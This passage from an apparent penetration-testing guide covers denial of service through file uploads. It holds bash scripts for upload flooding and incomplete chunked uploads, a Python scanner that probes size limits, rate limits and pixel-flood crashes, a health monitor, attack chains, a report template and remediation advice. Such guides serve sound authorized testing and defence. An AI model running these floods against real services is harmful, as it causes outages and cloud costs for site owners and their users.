  echo "[*] Monitor auto-scaling metrics (CloudWatch, GCP Console, etc.)"
  echo "[*] Look for: new instances spinning up, increased billing"

  wait 2>/dev/null
  rm -f /tmp/heavy.jpg
  ```
  :::
::

### Bandwidth Exhaustion

::code-group
```bash [Upload Bandwidth Flooding]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"

echo "═══ Bandwidth Exhaustion Test ═══"

# Create large file
dd if=/dev/zero bs=1M count=100 2>/dev/null > /tmp/bandwidth_test.bin

# Measure baseline bandwidth
echo "[*] Measuring upload bandwidth..."
START=$(date +%s%N)
curl -s -o /dev/null --max-time 60 \
  -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/bandwidth_test.bin;filename=bw_test.jpg;type=image/jpeg" \
  -H "Cookie: $COOKIE" 2>/dev/null
END=$(date +%s%N)
ELAPSED_MS=$(( (END - START) / 1000000 ))
SPEED_MBPS=$(echo "scale=1; 100 * 8 * 1000 / $ELAPSED_MS" | bc 2>/dev/null)
echo "[*] Upload speed: ~${SPEED_MBPS}Mbps (${ELAPSED_MS}ms for 100MB)"

# Parallel uploads to saturate bandwidth
echo ""
echo "[*] Parallel upload flood (5 concurrent)..."
for i in $(seq 1 5); do
    curl -s -o /dev/null --max-time 120 \
      -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/bandwidth_test.bin;filename=flood_${i}.jpg;type=image/jpeg" \
      -H "Cookie: $COOKIE" &
done

sleep 5
HEALTH=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://target.com/" 2>/dev/null)
echo "[*] Server health during flood: ${HEALTH}"

wait 2>/dev/null
rm -f /tmp/bandwidth_test.bin
```

```bash [Chunked Upload Amplification]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"

echo "═══ Chunked Upload Amplification ═══"

# If the application supports chunked uploads:
# Send many chunk-initiation requests (each creates server-side state)
# Never complete the uploads (leave resources allocated)

for i in $(seq 1 100); do
    # Initiate upload but send only first chunk
    dd if=/dev/zero bs=1M count=1 2>/dev/null | \
    curl -s -o /dev/null --max-time 5 \
      -X POST "${UPLOAD_URL}?chunk=0&chunks=100&name=chunk_${i}.jpg" \
      -F "file=@-;filename=chunk.bin" \
      -H "Cookie: $COOKIE" &

    [ $((i % 20)) -eq 0 ] && echo "  [*] ${i} incomplete uploads initiated"
done

echo "[*] ${i} incomplete uploads — server holds temp files for each"
wait 2>/dev/null
```
::

---

## Comprehensive Scanner

::code-collapse
```python [large_file_dos_scanner.py]
#!/usr/bin/env python3
"""
Large File DoS Scanner
Tests upload size limits, rate limits, resource exhaustion,
and cloud cost exposure.
"""
import requests
import time
import io
import sys
import os
import urllib3
urllib3.disable_warnings()

class LargeFileDoSScanner:
    def __init__(self, upload_url, field="file", cookies=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        if cookies:
            self.session.cookies.update(cookies)
        self.target = upload_url.rsplit('/', 2)[0]
        self.results = {
            'max_size': None, 'rate_limit': None, 'quota': None,
            'cloud_storage': None, 'slow_upload': None, 'pixel_flood': None,
        }

    def get_baseline(self):
        """Measure baseline server response time"""
        times = []
        for _ in range(3):
            try:
                start = time.time()
                self.session.get(self.target, timeout=10)
                times.append(time.time() - start)
            except:
                times.append(10.0)
        return sum(times) / len(times)

    def check_health(self):
        """Quick health check"""
        try:
            r = self.session.get(self.target, timeout=5)
            return r.status_code, time.time()
        except:
            return 0, time.time()

    def upload(self, content, filename, ct='image/jpeg', timeout=120):
        """Upload with timing"""
        files = {self.field: (filename, content, ct)}
        try:
            start = time.time()
            r = self.session.post(self.upload_url, files=files, timeout=timeout)
            elapsed = time.time() - start
            return r.status_code, elapsed, r.text[:200]
        except requests.exceptions.Timeout:
            return 0, timeout, 'TIMEOUT'
        except Exception as e:
            return 0, 0, str(e)

    def test_size_limits(self):
        """Find maximum accepted upload size"""
        print("\n[*] Phase 1: Size Limit Discovery")
        sizes_mb = [1, 2, 5, 10, 25, 50, 100, 200, 500]

        for size_mb in sizes_mb:
            content = b'\x00' * (size_mb * 1024 * 1024)
            status, elapsed, resp = self.upload(content, f'test_{size_mb}mb.bin',
                                                 'application/octet-stream', timeout=120)

            if status in [200, 201]:
                self.results['max_size'] = size_mb
                print(f"  [✓] {size_mb:4d} MB: ACCEPTED ({elapsed:.1f}s)")
            elif status == 413:
                print(f"  [✗] {size_mb:4d} MB: 413 Too Large")
                break
            elif status == 0:
                print(f"  [!] {size_mb:4d} MB: Connection error/timeout")
                break
            else:
                print(f"  [?] {size_mb:4d} MB: {status}")
                if status in [500, 502, 503]:
                    print(f"      [!!!] Server error — DoS impact at {size_mb}MB")
                    break

        if self.results['max_size']:
            print(f"\n  Maximum accepted: {self.results['max_size']} MB")
            if self.results['max_size'] >= 100:
                print(f"  [!!!] Very high limit — disk exhaustion risk")

    def test_rate_limits(self):
        """Check upload rate limiting"""
        print("\n[*] Phase 2: Rate Limit Detection")
        content = b'\x00' * (100 * 1024)  # 100KB
        count = 0
        start = time.time()

        for i in range(100):
            status, elapsed, resp = self.upload(content, f'rate_{i}.jpg', timeout=10)
            if status == 429:
                print(f"  [*] Rate limited after {count} uploads")
                self.results['rate_limit'] = count
                return
            if status in [200, 201]:
                count += 1
            if time.time() - start > 60:
                break

        self.results['rate_limit'] = count
        if count >= 50:
            print(f"  [!!!] {count} uploads in 60s — NO rate limiting detected")
        else:
            print(f"  [*] {count} uploads before limit/timeout")

    def test_cloud_storage(self):
        """Detect cloud storage backend"""
        print("\n[*] Phase 3: Cloud Storage Detection")
        content = b'\x00' * 1024
        status, elapsed, resp = self.upload(content, 'cloud_detect.jpg', timeout=15)

        providers = {
            's3.amazonaws': 'AWS S3',
            'storage.googleapis': 'Google Cloud Storage',
            'blob.core.windows': 'Azure Blob',
            'cloudinary': 'Cloudinary',
            'imgix': 'Imgix',
            'uploadcare': 'Uploadcare',
        }

        for pattern, name in providers.items():
            if pattern in resp.lower():
                self.results['cloud_storage'] = name
                print(f"  [+] Cloud storage: {name}")
                print(f"      → Unlimited storage but costs per GB")
                return

        print(f"  [*] Cloud storage not detected (may be local disk)")

    def test_pixel_flood(self):
        """Test image processing with large dimensions"""
        print("\n[*] Phase 4: Pixel Flood (Processing Memory Exhaustion)")
        baseline = self.get_baseline()

        try:
            from PIL import Image
        except ImportError:
            print("  [-] Pillow not installed — skipping pixel flood")
            return

        sizes = [(5000, 5000), (10000, 10000), (20000, 20000)]

        for w, h in sizes:
            try:
                img = Image.new('RGB', (w, h), 'white')
                buf = io.BytesIO()
                img.save(buf, 'JPEG', quality=5)
                content = buf.getvalue()

                ram_mb = w * h * 3 / 1024 / 1024

                status, elapsed, resp = self.upload(content, f'pixel_{w}x{h}.jpg', timeout=120)

                indicator = ' '
                if status in [500, 502, 503]:
                    indicator = '!'
                    self.results['pixel_flood'] = f'{w}x{h}'
                if elapsed > baseline * 20:
                    indicator = '~'

                print(f"  [{indicator}] {w}x{h} ({len(content)//1024}KB → {ram_mb:.0f}MB RAM): [{status}] {elapsed:.1f}s")

                if indicator == '!':
                    print(f"      [!!!] Server crashed processing {w}x{h} image!")
                    break
            except Exception as e:
                print(f"  [-] {w}x{h}: {e}")

    def test_slow_upload(self):
        """Test connection holding via slow upload"""
        print("\n[*] Phase 5: Slow Upload Tolerance")
        content = b'\x00' * (5 * 1024 * 1024)  # 5MB

        # Simulate slow upload by chunking manually
        try:
            start = time.time()
            # Use stream upload with small chunk size
            r = self.session.post(self.upload_url,
                files={self.field: ('slow.jpg', content, 'image/jpeg')},
                timeout=300, stream=True)
            elapsed = time.time() - start
            print(f"  [*] 5MB upload: [{r.status_code}] {elapsed:.1f}s")
        except:
            pass

    def scan(self):
        """Run all tests"""
        print(f"\n{'='*60}")
        print(f" Large File DoS Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.upload_url}")

        baseline = self.get_baseline()
        print(f"[*] Baseline response: {baseline:.2f}s")
        print("-" * 60)

        self.test_size_limits()
        self.test_rate_limits()
        self.test_cloud_storage()
        self.test_pixel_flood()

        # Summary
        print(f"\n{'='*60}")
        print(f" RESULTS")
        print(f"{'='*60}")

        risks = []

        if self.results['max_size'] and self.results['max_size'] >= 50:
            risks.append(f"Large uploads accepted ({self.results['max_size']}MB)")
        if self.results['rate_limit'] and self.results['rate_limit'] >= 50:
            risks.append(f"No rate limiting ({self.results['rate_limit']} uploads/min)")
        if self.results['cloud_storage']:
            risks.append(f"Cloud storage ({self.results['cloud_storage']}) — cost attack")
        if self.results['pixel_flood']:
            risks.append(f"Pixel flood crash at {self.results['pixel_flood']}")

        if risks:
            print(f"\n[!!!] DoS Risk Factors ({len(risks)}):")
            for r in risks:
                print(f"    ★ {r}")
        else:
            print("\n[*] No significant DoS vectors found")

        return self.results


if __name__ == "__main__":
    scanner = LargeFileDoSScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan()
```
::

---

## Server Health Monitoring

During DoS testing, continuously monitor the target to detect impact and stop before causing lasting damage.

::tabs
  :::tabs-item{icon="i-lucide-activity" label="Real-Time Health Monitor"}
  ```bash
  #!/bin/bash
  # Run in a separate terminal during DoS testing
  # Monitors server responsiveness and alerts on degradation

  TARGET="${1:-https://target.com}"
  INTERVAL="${2:-2}"
  DURATION="${3:-300}"

  echo "═══ Server Health Monitor ═══"
  echo "Target: $TARGET | Interval: ${INTERVAL}s | Duration: ${DURATION}s"
  echo ""
  printf "%-8s %-8s %-15s %-10s %s\n" "Time" "Status" "Response_Time" "Size" "Alert"
  printf "%-8s %-8s %-15s %-10s %s\n" "────" "──────" "─────────────" "────" "─────"

  # Baseline
  BASELINE_TIME=$(curl -s -o /dev/null -w "%{time_total}" --max-time 10 "$TARGET" 2>/dev/null)
  BASELINE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$TARGET" 2>/dev/null)

  START=$(date +%s)
  DEGRADATION_COUNT=0

  while true; do
      ELAPSED=$(( $(date +%s) - START ))
      [ "$ELAPSED" -ge "$DURATION" ] && break

      RESP_TIME=$(curl -s -o /dev/null -w "%{time_total}" --max-time 10 "$TARGET" 2>/dev/null)
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$TARGET" 2>/dev/null)
      SIZE=$(curl -s -o /dev/null -w "%{size_download}" --max-time 10 "$TARGET" 2>/dev/null)

      ALERT=""
      [ "$STATUS" = "000" ] && ALERT="⚠ SERVER DOWN!" && DEGRADATION_COUNT=$((DEGRADATION_COUNT + 1))
      [ "$STATUS" = "500" ] || [ "$STATUS" = "502" ] || [ "$STATUS" = "503" ] && ALERT="⚠ SERVER ERROR!" && DEGRADATION_COUNT=$((DEGRADATION_COUNT + 1))

      # Check if response is 5x slower than baseline
      SLOW=$(echo "$RESP_TIME > $BASELINE_TIME * 5" | bc 2>/dev/null)
      [ "$SLOW" = "1" ] && ALERT="${ALERT} ⚠ SLOW (${RESP_TIME}s vs baseline ${BASELINE_TIME}s)"

      printf "%-8s %-8s %-15s %-10s %s\n" "${ELAPSED}s" "$STATUS" "${RESP_TIME}s" "$SIZE" "$ALERT"

      if [ "$DEGRADATION_COUNT" -ge 3 ]; then
          echo ""
          echo "[!!!] PERSISTENT DEGRADATION DETECTED — STOP TESTING!"
          echo "      ${DEGRADATION_COUNT} consecutive failures"
          break
      fi

      sleep "$INTERVAL"
  done

  echo ""
  echo "[*] Monitoring complete. Total degradation events: ${DEGRADATION_COUNT}"
  ```
  :::
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: No Size Limit → Disk Full → Cascading Failure
  ---
  1. Application has no server-side upload size limit
  2. Client-side JS limit bypassed with cURL
  3. Upload 100 × 500MB files = 50GB consumed
  4. Server disk fills → database writes fail → logging stops
  5. Application crashes, monitoring blind, full outage
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Pixel Flood → OOM Kill → Service Restart Loop
  ---
  1. Upload 20000×20000 JPEG (tiny file, ~30GB RAM when decoded)
  2. Image processing library (ImageMagick/GD) attempts to decode
  3. Server memory exhausted → OOM killer terminates process
  4. Auto-restart triggers → next queued image causes same crash
  5. Restart loop → persistent DoS
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Cloud Upload → S3 Storage → Monthly Bill Spike
  ---
  1. Application uploads to S3 without size/count limits
  2. Automated script uploads 1000 × 100MB = 100GB
  3. S3 storage costs: ~$2.30/month (small but growing)
  4. Scaled to 10TB: $230/month just in storage
  5. Download costs compound → unexpected thousands in billing
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Slow Upload → Worker Exhaustion → Service Unavailable
  ---
  1. Send uploads at 1KB/s (effectively Slowloris via upload)
  2. Each connection occupies one server worker for 10+ minutes
  3. Open 50 concurrent slow uploads = 50 workers blocked
  4. No workers available for legitimate requests
  5. Application appears down to all other users
  :::

  :::card
  ---
  icon: i-lucide-link
  title: No Rate Limit → Temp Disk → /tmp Full → All Services Fail
  ---
  1. PHP stores uploads in /tmp during processing
  2. No rate limit → 100 concurrent uploads
  3. Each creates temporary file in /tmp
  4. /tmp partition fills (often small, shared partition)
  5. Other services using /tmp fail → cascading outage
  :::
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`Denial of Service via Unrestricted Upload Size / Missing Rate Limiting at [Endpoint]`

#### Root Cause
The file upload endpoint at `POST /api/upload` lacks adequate server-side controls for file size, upload count, and processing resource limits. While client-side JavaScript restricts uploads to 5MB, the server accepts files up to [X]MB without limit. No rate limiting is applied, allowing rapid sequential or parallel uploads that consume server disk space, memory, and processing capacity.

#### Reproduction
```bash
# Bypass client-side 5MB limit with cURL
dd if=/dev/zero bs=1M count=200 > large.bin
curl -X POST "https://target.com/api/upload" \
  -F "file=@large.bin;filename=test.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"
# 200 OK — 200MB file accepted despite 5MB "limit"

# Rapid upload flood (no rate limiting)
for i in $(seq 1 50); do
    curl -s -X POST "https://target.com/api/upload" \
      -F "file=@large.bin;filename=flood_${i}.jpg" \
      -H "Cookie: session=TOKEN" &
done
# All 50 accepted — 10GB consumed in seconds
```

#### Impact
An authenticated attacker (or unauthenticated, if upload is public) can exhaust server disk space by uploading files significantly larger than intended. With no rate limiting, rapid parallel uploads accelerate the attack. Server health degrades after approximately [X]GB of uploads. In the cloud deployment, each upload incurs storage costs billable to the target organization.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Enforce Server-Side Size Limits
  ---
  Set upload size limits at **every layer**: reverse proxy (`client_max_body_size`), web server (`LimitRequestBody`), application runtime (`upload_max_filesize`), and application code. The most restrictive limit should match business requirements (usually 5-10MB for images, 25-50MB for documents).
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Implement Rate Limiting
  ---
  Limit uploads per user per time window: e.g., 10 uploads per minute, 100 per hour. Use token bucket or sliding window algorithms. Apply rate limits at the API gateway level to prevent bypassing.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Per-User Storage Quotas
  ---
  Enforce total storage quotas per user account: e.g., 500MB per user. Track usage in the database and reject uploads that would exceed the quota. Clean up when users delete files.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Validate Image Dimensions
  ---
  Check image dimensions **before** full processing. Reject images with dimensions exceeding reasonable limits (e.g., max 10000×10000). This prevents pixel flood attacks that consume RAM during resize.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Stream Processing
  ---
  Process uploads as streams rather than loading entire files into memory. Use streaming multipart parsers and streaming image processing to limit memory consumption regardless of file size.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Upload Timeouts
  ---
  Set aggressive timeouts for upload requests: 30-60 seconds maximum. Kill connections that trickle data slowly. This prevents Slowloris-style upload attacks from exhausting workers.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Monitoring & Alerting
  ---
  Monitor disk usage, upload volume, and per-user upload patterns. Alert on sudden spikes in upload volume, disk consumption rate, or individual users uploading abnormal amounts. Auto-block IPs or accounts exhibiting abuse patterns.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Cloud Cost Controls
  ---
  If using cloud storage: set bucket size alerts, enable lifecycle policies to auto-delete old uploads, set billing alerts for unexpected cost spikes, and use S3 Object Lock or equivalent to prevent bucket bombing.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP guide covering file upload vulnerabilities including resource exhaustion via oversized uploads and remediation guidance.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-400 — Uncontrolled Resource Consumption
  to: https://cwe.mitre.org/data/definitions/400.html
  target: _blank
  ---
  MITRE CWE entry covering resource exhaustion vulnerabilities including disk, memory, and CPU consumption through file uploads.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-770 — Allocation of Resources Without Limits
  to: https://cwe.mitre.org/data/definitions/770.html
  target: _blank
  ---
  CWE covering insufficient resource allocation limits — directly applicable to upload size and count restrictions.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload DoS
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Practical file upload exploitation guide covering resource exhaustion, pixel floods, and archive bomb techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Nginx — client_max_body_size
  to: https://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size
  target: _blank
  ---
  Nginx documentation for the `client_max_body_size` directive — the reverse proxy layer's upload size control.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PHP — File Upload Configuration
  to: https://www.php.net/manual/en/ini.core.php#ini.upload-max-filesize
  target: _blank
  ---
  PHP documentation for `upload_max_filesize`, `post_max_size`, and `memory_limit` — application runtime upload controls.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: AWS S3 — Cost Calculator
  to: https://calculator.aws/
  target: _blank
  ---
  AWS cost calculator for estimating financial impact of cloud storage abuse through unrestricted uploads.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Labs
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive labs covering file upload vulnerabilities including size limit bypasses and processing-based attacks.
  :::
::